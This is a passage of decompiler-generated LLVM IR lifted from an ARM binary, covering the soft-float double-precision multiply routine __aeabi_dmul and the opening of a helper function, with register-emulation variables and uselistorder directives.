  uselistorder i32 3, { 65, 17, 50, 81, 51, 27, 28, 83, 22, 84, 85, 23, 86, 87, 13, 68, 0, 30, 29, 52, 3, 2, 1, 4, 88, 31, 5, 6, 14, 7, 8, 53, 54, 96, 55, 56, 57, 58, 59, 60, 69, 11, 32, 70, 33, 72, 34, 73, 35, 74, 36, 75, 37, 76, 12, 66, 97, 18, 67, 93, 94, 24, 92, 15, 89, 16, 71, 9, 10, 61, 25, 62, 26, 95, 63, 20, 38, 77, 78, 21, 79, 39, 80, 64, 42, 41, 40, 49, 82, 43, 90, 91, 44, 45, 46, 47, 48, 19 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a2d8 = load i32, i32* @r4, align 4
  store i32 %v3_1a2d8, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1a2e4 = udiv i32 %arg1, 1048576
  %v5_1a2e4 = urem i32 %v4_1a2e4, 2048
  store i32 %v5_1a2e4, i32* %r4.global-to-local, align 4
  %v6_1a2e4 = icmp eq i32 %v5_1a2e4, 0
  br i1 %v6_1a2e4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_1a2e8 = udiv i32 %arg3, 1048576
  %v6_1a2e8 = urem i32 %v5_1a2e8, 2048
  store i32 %v6_1a2e8, i32* @r5, align 4
  %v7_1a2e8 = icmp eq i32 %v6_1a2e8, 0
  br i1 %v7_1a2e8, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_1a2ec = icmp eq i32 %v5_1a2e4, 2047
  br i1 %v5_1a2ec, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1a2f0 = icmp eq i32 %v6_1a2e8, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_1a2f4 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1a2f0, %bb42 ], [ true, %entry ]
  store i32 107256, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1a2f4, i32 ptrtoint (i32* @global_var_1a574.1365 to i32))
  %v0_1a2f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a2f8 = load i32, i32* @r5, align 4
  %v2_1a2f8 = add i32 %v1_1a2f8, %v0_1a2f8
  store i32 %v2_1a2f8, i32* %r4.global-to-local, align 4
  %v2_1a2fc = xor i32 %arg3, %arg1
  %v1_1a300 = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_1a300, -2097152
  %v5_1a300 = add i32 %tmp, -1
  %v6_1a300 = and i32 %v5_1a300, %arg1
  store i32 %v6_1a300, i32* %r0.global-to-local, align 4
  %v6_1a304 = and i32 %v5_1a300, %arg3
  store i32 %v6_1a304, i32* %r2.global-to-local, align 4
  %v4_1a308 = mul i32 %arg1, 4096
  %v5_1a308 = or i32 %v4_1a308, %arg2
  %v7_1a308 = icmp eq i32 %v5_1a308, 0
  br i1 %v7_1a308, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1a31017 = or i32 %v6_1a300, 1048576
  store i32 %v1_1a31017, i32* %r0.global-to-local, align 4
  %v1_1a31418 = or i32 %v6_1a304, 1048576
  store i32 %v1_1a31418, i32* %r2.global-to-local, align 4
  %v1_1a44c19 = and i32 %v2_1a2fc, -2147483648
  br label %dec_label_pc_1a44c

bb43:                                             ; preds = %.thread1
  %v5_1a30c = mul i32 %arg3, 4096
  %v6_1a30c = or i32 %v5_1a30c, %arg4
  %v8_1a30c = icmp eq i32 %v6_1a30c, 0
  %v1_1a310 = or i32 %v6_1a300, 1048576
  store i32 %v1_1a310, i32* %r0.global-to-local, align 4
  %v1_1a314 = or i32 %v6_1a304, 1048576
  store i32 %v1_1a314, i32* %r2.global-to-local, align 4
  %v1_1a44c = and i32 %v2_1a2fc, -2147483648
  br i1 %v8_1a30c, label %dec_label_pc_1a44c, label %dec_label_pc_1a31c

dec_label_pc_1a31c:                               ; preds = %bb43
  store i32 %v1_1a44c, i32* %stack_var_-40, align 4
  %v9_1a320 = load i32, i32* @r8, align 4
  %v12_1a320 = load i32, i32* @sb, align 4
  %v3_1a324 = udiv i32 %arg2, 65536
  %v3_1a328 = udiv i32 %arg4, 65536
  store i32 %v3_1a328, i32* %r8.global-to-local, align 4
  %v3_1a32c = udiv i32 %v1_1a310, 65536
  store i32 %v3_1a32c, i32* %sb.global-to-local, align 4
  %v3_1a330 = udiv i32 %v1_1a314, 65536
  %tmp59 = mul i32 %v3_1a324, -65536
  %v5_1a334 = add i32 %tmp59, -1
  %v6_1a334 = and i32 %v5_1a334, %arg2
  store i32 %v6_1a334, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1a328, -65536
  %v5_1a338 = add i32 %tmp60, -1
  %v6_1a338 = and i32 %v5_1a338, %arg4
  %tmp61 = mul i32 %v3_1a32c, -65536
  %v5_1a33c = add i32 %tmp61, -1
  %v6_1a33c = and i32 %v6_1a300, %v5_1a33c
  store i32 %v6_1a33c, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_1a330, -65536
  %v5_1a340 = add i32 %tmp62, -1
  %v6_1a340 = and i32 %v6_1a304, %v5_1a340
  store i32 %v6_1a340, i32* %r2.global-to-local, align 4
  %v2_1a344 = mul i32 %v6_1a338, %v6_1a334
  %v2_1a348 = mul i32 %v3_1a328, %v6_1a334
  %v2_1a354 = and i32 %v2_1a348, 32768
  %v3_1a354 = icmp ne i32 %v2_1a354, 0
  %v4_1a354 = udiv i32 %v2_1a348, 65536
  %v7_1a354 = zext i1 %v3_1a354 to i32
  %v2_1a358 = mul i32 %v6_1a338, %v3_1a324
  %tmp53 = add i32 %v2_1a358, %v2_1a348
  %tmp54 = mul i32 %tmp53, 65536
  %v5_1a35c = add i32 %tmp54, %v2_1a344
  store i32 %v5_1a35c, i32* %ip.global-to-local, align 4
  %v2_1a360 = and i32 %v2_1a358, 32768
  %v3_1a360 = icmp ne i32 %v2_1a360, 0
  %v4_1a360 = udiv i32 %v2_1a358, 65536
  %v7_1a360 = zext i1 %v3_1a360 to i32
  %v2_1a364 = mul i32 %v3_1a330, %v6_1a334
  %v2_1a370 = and i32 %v2_1a364, 32768
  %v3_1a370 = icmp ne i32 %v2_1a370, 0
  %v4_1a370 = udiv i32 %v2_1a364, 65536
  %v7_1a370 = zext i1 %v3_1a370 to i32
  %v8_1a370 = add nuw nsw i32 %v7_1a370, %v4_1a370
  %v2_1a374 = mul i32 %v6_1a340, %v3_1a324
  %v2_1a37c = and i32 %v2_1a374, 32768
  %v3_1a37c = icmp ne i32 %v2_1a37c, 0
  %v4_1a37c = udiv i32 %v2_1a374, 65536
  %v6_1a37c = add nuw nsw i32 %v8_1a370, %v4_1a37c
  %v7_1a37c = zext i1 %v3_1a37c to i32
  %v8_1a37c = add nuw nsw i32 %v6_1a37c, %v7_1a37c
  %v2_1a380 = mul i32 %v3_1a328, %v6_1a33c
  %v2_1a388 = and i32 %v2_1a380, 32768
  %v3_1a388 = icmp ne i32 %v2_1a388, 0
  %v4_1a388 = udiv i32 %v2_1a380, 65536
  %v6_1a388 = add nuw nsw i32 %v8_1a37c, %v4_1a388
  %v7_1a388 = zext i1 %v3_1a388 to i32
  %v8_1a388 = add nuw nsw i32 %v6_1a388, %v7_1a388
  %v2_1a38c = mul i32 %v6_1a338, %v3_1a32c
  %v4_1a390 = mul i32 %v2_1a38c, 65536
  %tmp55 = add i32 %v2_1a374, %v2_1a364
  %tmp56 = add i32 %tmp55, %v2_1a380
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1a360 = add nuw nsw i32 %v7_1a354, %v4_1a354
  %v5_1a36c = add nuw nsw i32 %v8_1a360, %v4_1a360
  %v5_1a378 = add nuw nsw i32 %v5_1a36c, %v7_1a360
  %v5_1a384 = add i32 %v5_1a378, %v4_1a390
  %v5_1a390 = add i32 %v5_1a384, %tmp57
  %v2_1a394 = and i32 %v2_1a38c, 32768
  %v3_1a394 = icmp ne i32 %v2_1a394, 0
  %v4_1a394 = udiv i32 %v2_1a38c, 65536
  %v6_1a394 = add nuw nsw i32 %v8_1a388, %v4_1a394
  %v7_1a394 = zext i1 %v3_1a394 to i32
  %v8_1a394 = add i32 %v6_1a394, %v7_1a394
  %v2_1a398 = mul i32 %v3_1a330, %v6_1a33c
  %v2_1a39c = mul nuw i32 %v3_1a330, %v3_1a32c
  %v4_1a3a0 = mul i32 %v2_1a398, 65536
  %v5_1a3a0 = add i32 %v8_1a394, %v4_1a3a0
  %v2_1a3a4 = and i32 %v2_1a398, 32768
  %v3_1a3a4 = icmp ne i32 %v2_1a3a4, 0
  %v4_1a3a4 = udiv i32 %v2_1a398, 65536
  %v6_1a3a4 = add i32 %v4_1a3a4, %v2_1a39c
  %v7_1a3a4 = zext i1 %v3_1a3a4 to i32
  %v2_1a3a8 = mul i32 %v6_1a340, %v3_1a32c
  %v4_1a3ac = mul i32 %v2_1a3a8, 65536
  %v5_1a3ac = add i32 %v5_1a3a0, %v4_1a3ac
  %v2_1a3b0 = and i32 %v2_1a3a8, 32768
  %v3_1a3b0 = icmp ne i32 %v2_1a3b0, 0
  %v4_1a3b0 = udiv i32 %v2_1a3a8, 65536
  %v7_1a3b0 = zext i1 %v3_1a3b0 to i32
  %v2_1a3b4 = mul i32 %v6_1a334, %v6_1a340
  %v2_1a3b8 = add i32 %v2_1a3b4, %v5_1a390
  %v3_1a3b8 = icmp ult i32 %v2_1a3b8, %v5_1a390
  %v2_1a3bc = mul nuw i32 %v3_1a324, %v3_1a330
  %v3_1a3c0 = add i32 %v5_1a3ac, %v2_1a3bc
  %v4_1a3c0 = zext i1 %v3_1a3b8 to i32
  %v5_1a3c0 = add i32 %v4_1a3c0, %v3_1a3c0
  %v9_1a3c0 = icmp ule i32 %v5_1a3c0, %v5_1a3ac
  %v10_1a3c0 = icmp ult i32 %v3_1a3c0, %v5_1a3ac
  %v11_1a3c0 = select i1 %v3_1a3b8, i1 %v9_1a3c0, i1 %v10_1a3c0
  %v2_1a3c4 = mul i32 %v6_1a338, %v6_1a33c
  %v2_1a3c8 = zext i1 %v11_1a3c0 to i32
  %v2_1a3cc = add i32 %v2_1a3c4, %v2_1a3b8
  %v3_1a3cc = icmp ult i32 %v2_1a3cc, %v2_1a3b8
  %v0_1a3d0 = load i32, i32* %sb.global-to-local, align 4
  %v1_1a3d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a3d0 = mul i32 %v1_1a3d0, %v0_1a3d0
  %v3_1a3d4 = add i32 %v2_1a3d0, %v5_1a3c0
  %v4_1a3d4 = zext i1 %v3_1a3cc to i32
  %v5_1a3d4 = add i32 %v4_1a3d4, %v3_1a3d4
  %v9_1a3d4 = icmp ule i32 %v5_1a3d4, %v5_1a3c0
  %v10_1a3d4 = icmp ult i32 %v3_1a3d4, %v5_1a3c0
  %v11_1a3d4 = select i1 %v3_1a3cc, i1 %v9_1a3d4, i1 %v10_1a3d4
  %v2_1a3d8 = mul i32 %v1_1a3d0, %v3_1a324
  %v2_1a3dc = zext i1 %v11_1a3d4 to i32
  %v8_1a3a4 = add i32 %v6_1a3a4, %v4_1a3b0
  %v6_1a3b0 = add i32 %v8_1a3a4, %v7_1a3a4
  %v8_1a3b0 = add i32 %v6_1a3b0, %v7_1a3b0
  %v3_1a3c8 = add i32 %v8_1a3b0, %v2_1a3c8
  %v3_1a3dc = add i32 %v3_1a3c8, %v2_1a3dc
  %v2_1a3e0 = add i32 %v2_1a3d8, %v2_1a3cc
  store i32 %v2_1a3e0, i32* %lr.global-to-local, align 4
  %v3_1a3e0 = icmp ult i32 %v2_1a3e0, %v2_1a3cc
  %v1_1a3e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a3e4 = mul i32 %v1_1a3e4, %v6_1a33c
  %v3_1a3e8 = add i32 %v5_1a3d4, %v2_1a3e4
  %v4_1a3e8 = zext i1 %v3_1a3e0 to i32
  %v5_1a3e8 = add i32 %v4_1a3e8, %v3_1a3e8
  %v9_1a3e8 = icmp ule i32 %v5_1a3e8, %v5_1a3d4
  %v10_1a3e8 = icmp ult i32 %v3_1a3e8, %v5_1a3d4
  %v11_1a3e8 = select i1 %v3_1a3e0, i1 %v9_1a3e8, i1 %v10_1a3e8
  %v2_1a3ec = zext i1 %v11_1a3e8 to i32
  %v3_1a3ec = add i32 %v2_1a3ec, %v3_1a3dc
  %v2_1a3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_1a320, i32* %r8.global-to-local, align 4
  store i32 %v12_1a320, i32* %sb.global-to-local, align 4
  %v0_1a3f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a3f4 = icmp eq i32 %v0_1a3f4, 0
  br i1 %v2_1a3f4, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1a31c
  %v2_1a3f8 = or i32 %v2_1a3e0, 1
  store i32 %v2_1a3f8, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1a31c, %bb44
  %v0_1a40c = phi i32 [ %v2_1a3e0, %dec_label_pc_1a31c ], [ %v2_1a3f8, %bb44 ]
  %v0_1a3fc = load i32, i32* %r4.global-to-local, align 4
  %v1_1a3fc = add i32 %v0_1a3fc, -255
  %v2_1a400 = icmp ugt i32 %v3_1a3ec, 511
  %v2_1a404 = icmp eq i1 %v2_1a400, false
  %v5_1a404 = sext i1 %v2_1a404 to i32
  %v3_1a404 = add nsw i32 %v5_1a404, -1023
  %v6_1a404 = add i32 %v3_1a404, %v0_1a3fc
  store i32 %v6_1a404, i32* %r4.global-to-local, align 4
  %v3_1a408 = icmp ugt i32 %v1_1a3fc, 768
  br i1 %v3_1a408, label %dec_label_pc_1a418, label %dec_label_pc_1a40c

dec_label_pc_1a40c:                               ; preds = %bb45
  %v1_1a40c = icmp slt i32 %v0_1a40c, 0
  %v2_1a40c = mul i32 %v0_1a40c, 2
  store i32 %v2_1a40c, i32* %lr.global-to-local, align 4
  %v3_1a410 = mul i32 %v5_1a3e8, 2
  %v4_1a410 = zext i1 %v1_1a40c to i32
  %v5_1a410 = or i32 %v4_1a410, %v3_1a410
  %v9_1a410 = icmp ule i32 %v5_1a410, %v5_1a3e8
  %v10_1a410 = icmp ult i32 %v3_1a410, %v5_1a3e8
  %v11_1a410 = select i1 %v1_1a40c, i1 %v9_1a410, i1 %v10_1a410
  %v3_1a414 = mul i32 %v3_1a3ec, 2
  %v4_1a414 = zext i1 %v11_1a410 to i32
  %v5_1a414 = or i32 %v4_1a414, %v3_1a414
  br label %dec_label_pc_1a418

dec_label_pc_1a418:                               ; preds = %bb45, %dec_label_pc_1a40c
  %v0_1a428 = phi i32 [ %v0_1a40c, %bb45 ], [ %v2_1a40c, %dec_label_pc_1a40c ]
  %v0_1a420 = phi i32 [ %v5_1a3e8, %bb45 ], [ %v5_1a410, %dec_label_pc_1a40c ]
  %v1_1a418 = phi i32 [ %v3_1a3ec, %bb45 ], [ %v5_1a414, %dec_label_pc_1a40c ]
  %v4_1a418 = mul i32 %v1_1a418, 2048
  %v4_1a41c = udiv i32 %v0_1a420, 2097152
  %v5_1a418 = or i32 %v4_1a41c, %v2_1a3f0
  %v5_1a41c = or i32 %v5_1a418, %v4_1a418
  store i32 %v5_1a41c, i32* %r0.global-to-local, align 4
  %v3_1a420 = mul i32 %v0_1a420, 2048
  %v4_1a424 = udiv i32 %v0_1a428, 2097152
  %v5_1a424 = or i32 %v3_1a420, %v4_1a424
  store i32 %v5_1a424, i32* %r1.global-to-local, align 4
  %v3_1a428 = mul i32 %v0_1a428, 2048
  store i32 %v3_1a428, i32* %lr.global-to-local, align 4
  %v1_1a42c = add i32 %v6_1a404, -253
  store i32 %v1_1a42c, i32* %ip.global-to-local, align 4
  %v2_1a42c = icmp ugt i32 %v6_1a404, 252
  %v7_1a42c = icmp eq i32 %v6_1a404, 253
  %v2_1a430 = xor i1 %v7_1a42c, true
  %v3_1a430 = and i1 %v2_1a42c, %v2_1a430
  br i1 %v3_1a430, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1a418
  %v6_1a430 = icmp ugt i32 %v1_1a42c, 1791
  %v11_1a430 = icmp eq i32 %v1_1a42c, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1a418, %bb46
  %v1_1a434 = phi i1 [ %v7_1a42c, %dec_label_pc_1a418 ], [ %v11_1a430, %bb46 ]
  %v0_1a434 = phi i1 [ %v2_1a42c, %dec_label_pc_1a418 ], [ %v6_1a430, %bb46 ]
  %v2_1a434 = xor i1 %v1_1a434, true
  %v3_1a434 = and i1 %v0_1a434, %v2_1a434
  call void @__pseudo_cond_branch(i1 %v3_1a434, i32 ptrtoint (i32* @global_var_1a478.1366 to i32))
  %v0_1a438 = load i32, i32* %lr.global-to-local, align 4
  %v2_1a438 = icmp slt i32 %v0_1a438, 0
  %v6_1a438 = icmp eq i32 %v0_1a438, -2147483648
  %v1_1a43c = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1a438, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_1a43c = urem i32 %v1_1a43c, 2
  %v3_1a43c = icmp ne i32 %v2_1a43c, 0
  %v4_1a43c = udiv i32 %v1_1a43c, 2
  store i32 %v4_1a43c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_1a440 = phi i1 [ %v3_1a43c, %bb48 ], [ %v2_1a438, %bb47 ]
  %v2_1a440 = zext i1 %v1_1a440 to i32
  %v3_1a440 = add i32 %v2_1a440, %v1_1a43c
  store i32 %v3_1a440, i32* %r1.global-to-local, align 4
  %v0_1a444 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a444 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a444 = and i32 %v1_1a444, 4096
  %v3_1a444 = icmp ne i32 %v2_1a444, 0
  %v4_1a444 = mul i32 %v1_1a444, 1048576
  %v6_1a444 = add i32 %v4_1a444, %v0_1a444
  %v7_1a444 = zext i1 %v3_1a444 to i32
  %v8_1a444 = add i32 %v7_1a444, %v6_1a444
  store i32 %v8_1a444, i32* %r0.global-to-local, align 4
  %v2_1a448 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a448, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a444

dec_label_pc_1a44c:                               ; preds = %.thread, %bb43
  %v1_1a44c22 = phi i32 [ %v1_1a44c19, %.thread ], [ %v1_1a44c, %bb43 ]
  %v1_1a31421 = phi i32 [ %v1_1a31418, %.thread ], [ %v1_1a314, %bb43 ]
  %v1_1a31020 = phi i32 [ %v1_1a31017, %.thread ], [ %v1_1a310, %bb43 ]
  %v2_1a450 = or i32 %v1_1a31020, %v1_1a44c22
  %v2_1a454 = or i32 %arg4, %arg2
  store i32 %v2_1a454, i32* %r1.global-to-local, align 4
  %v2_1a458 = xor i32 %v2_1a450, %v1_1a31421
  store i32 %v2_1a458, i32* %r0.global-to-local, align 4
  %v4_1a45c = udiv i32 %v1_1a300, 2
  %v5_1a45c = sub i32 %v2_1a2f8, %v4_1a45c
  store i32 %v5_1a45c, i32* %r4.global-to-local, align 4
  %v7_1a45c = sub i32 0, %v5_1a45c
  %v8_1a45c = and i32 %v2_1a2f8, %v7_1a45c
  %v11_1a45c = icmp eq i32 %v2_1a2f8, %v4_1a45c
  %v7_1a460 = icmp sgt i32 %v2_1a2f8, %v4_1a45c
  br i1 %v7_1a460, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_1a44c
  %v10_1a460 = sub i32 %v1_1a300, %v5_1a45c
  %v12_1a460 = xor i32 %v5_1a45c, %v1_1a300
  %v13_1a460 = xor i32 %v10_1a460, %v1_1a300
  %v14_1a460 = and i32 %v13_1a460, %v12_1a460
  %v17_1a460 = icmp eq i32 %v1_1a300, %v5_1a45c
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_1a44c, %bb49
  %v2_1a468.in = phi i32 [ %v8_1a45c, %dec_label_pc_1a44c ], [ %v14_1a460, %bb49 ]
  %v1_1a468.in = phi i32 [ %v5_1a45c, %dec_label_pc_1a44c ], [ %v10_1a460, %bb49 ]
  %v0_1a468 = phi i1 [ %v11_1a45c, %dec_label_pc_1a44c ], [ %v17_1a460, %bb49 ]
  %v1_1a468 = icmp slt i32 %v1_1a468.in, 0
  %v2_1a468 = icmp slt i32 %v2_1a468.in, 0
  %v3_1a464 = xor i1 %v2_1a468, %v1_1a468
  %v4_1a464 = or i1 %v0_1a468, %v3_1a464
  br i1 %v4_1a464, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1a46428 = mul i32 %v5_1a45c, 1048576
  %v10_1a46429 = or i32 %v2_1a458, %v9_1a46428
  store i32 %v10_1a46429, i32* %r0.global-to-local, align 4
  %v7_1a468 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1a468, i32* %r4.global-to-local, align 4
  ret i32 %v10_1a46429

bb52:                                             ; preds = %bb50
  %v1_1a46c = or i32 %v2_1a458, 1048576
  store i32 %v1_1a46c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_1a474 = add i32 %v5_1a45c, -1
  store i32 %v1_1a474, i32* %r4.global-to-local, align 4
  ret i32 %v1_1a46c

; uselistorder directives
  uselistorder i32 %v5_1a45c, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_1a45c, { 2, 1, 0 }
  uselistorder i32 %v2_1a458, { 1, 0, 2 }
  uselistorder i32 %v1_1a43c, { 2, 0, 1 }
  uselistorder i32 %v0_1a438, { 1, 0 }
  uselistorder i1 %v7_1a42c, { 1, 0 }
  uselistorder i32 %v2_1a40c, { 1, 0 }
  uselistorder i1 %v1_1a40c, { 1, 0 }
  uselistorder i32 %v6_1a404, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a40c, { 1, 0, 2 }
  uselistorder i32 %v3_1a3ec, { 1, 0, 2 }
  uselistorder i32 %v5_1a3e8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1a3e8, { 1, 0 }
  uselistorder i1 %v3_1a3e0, { 1, 0 }
  uselistorder i32 %v5_1a3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1a3d4, { 1, 0 }
  uselistorder i1 %v3_1a3cc, { 1, 0 }
  uselistorder i32 %v2_1a3cc, { 1, 0, 2 }
  uselistorder i32 %v5_1a3c0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1a3c0, { 1, 0 }
  uselistorder i1 %v3_1a3b8, { 1, 0 }
  uselistorder i32 %v2_1a3b8, { 1, 0, 2 }
  uselistorder i32 %v5_1a3ac, { 2, 1, 0 }
  uselistorder i32 %v2_1a3a8, { 1, 2, 0 }
  uselistorder i32 %v2_1a398, { 0, 2, 1 }
  uselistorder i32 %v5_1a390, { 1, 0 }
  uselistorder i32 %v2_1a38c, { 1, 2, 0 }
  uselistorder i32 %v2_1a380, { 1, 0, 2 }
  uselistorder i32 %v2_1a374, { 1, 0, 2 }
  uselistorder i32 %v2_1a364, { 1, 0, 2 }
  uselistorder i32 %v2_1a358, { 0, 2, 1 }
  uselistorder i32 %v2_1a348, { 1, 0, 2 }
  uselistorder i32 %v6_1a340, { 1, 0, 2, 3 }
  uselistorder i32 %v6_1a33c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_1a334, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1a330, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_1a32c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1a328, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1a324, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1a314, { 1, 0, 2 }
  uselistorder i32 %v1_1a310, { 1, 0, 2 }
  uselistorder i32 %v6_1a304, { 0, 2, 1, 3 }
  uselistorder i32 %v6_1a300, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1a300, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1a2fc, { 1, 0 }
  uselistorder i32 %v2_1a2f8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1a2e8, { 2, 1, 0 }
  uselistorder i32 %v5_1a2e4, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 0, 13, 12 }
  uselistorder i32 65536, { 2, 0, 3, 92, 4, 93, 1, 5, 6, 7, 8, 94, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 28, 24, 29, 25, 30, 26, 31, 27, 32, 33, 34, 38, 35, 39, 36, 40, 37, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 95, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 86, 84, 87, 89, 90, 88, 91, 96 }
  uselistorder i32* @sb, { 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 2, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 4, 5, 6, 7, 8, 9, 0, 10 }
  uselistorder i32* @r8, { 23, 35, 36, 37, 38, 39, 40, 41, 5, 6, 7, 42, 47, 48, 0, 49, 84, 85, 86, 87, 1, 88, 89, 90, 91, 99, 100, 8, 9, 10, 11, 12, 13, 14, 98, 92, 93, 94, 95, 96, 97, 24, 25, 26, 27, 28, 29, 30, 3, 4, 21, 22, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 2, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 31, 32, 33, 34, 43, 44, 45, 46, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1a44c, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1a418, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_1a478(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a478:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_1a478 = load i1, i1* @cpsr_z, align 1
  %v1_1a478 = load i1, i1* @cpsr_n, align 1
  %v2_1a478 = load i1, i1* @cpsr_v, align 1
  %v3_1a478 = xor i1 %v1_1a478, %v2_1a478
  %v4_1a478 = or i1 %v0_1a478, %v3_1a478
  br i1 %v4_1a478, label %dec_label_pc_1a47c, label %dec_label_pc_1a5e0

dec_label_pc_1a47c:                               ; preds = %dec_label_pc_1a478
  %v0_1a47c = load i32, i32* @r4, align 4
  %v4_1a47c = add i32 %v0_1a47c, 54
  %v6_1a47c = sub i32 0, %v0_1a47c
  %v7_1a47c = and i32 %v4_1a47c, %v6_1a47c
  %v8_1a47c = icmp slt i32 %v7_1a47c, 0
  store i1 %v8_1a47c, i1* @cpsr_v, align 1
  %v9_1a47c = icmp slt i32 %v4_1a47c, 0
  store i1 %v9_1a47c, i1* @cpsr_n, align 1
  %v10_1a47c = icmp eq i32 %v4_1a47c, 0
  store i1 %v10_1a47c, i1* @cpsr_z, align 1
  %v7_1a480 = icmp sgt i32 %v0_1a47c, -54
  br i1 %v7_1a480, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1a47c
  store i32 0, i32* @r1, align 4
  %v8_1a484 = load i32, i32* %r0.global-to-local, align 4
  %v9_1a484 = and i32 %v8_1a484, -2147483648
  store i32 %v9_1a484, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1a484

bb6:                                              ; preds = %dec_label_pc_1a47c
  %v1_1a48c = sub i32 0, %v0_1a47c
  %v2_1a490 = sub i32 -32, %v0_1a47c
  %v4_1a490 = add i32 %v0_1a47c, 31
  %v5_1a490 = and i32 %v4_1a490, %v1_1a48c
  %v6_1a490 = icmp slt i32 %v5_1a490, 0
  store i1 %v6_1a490, i1* @cpsr_v, align 1
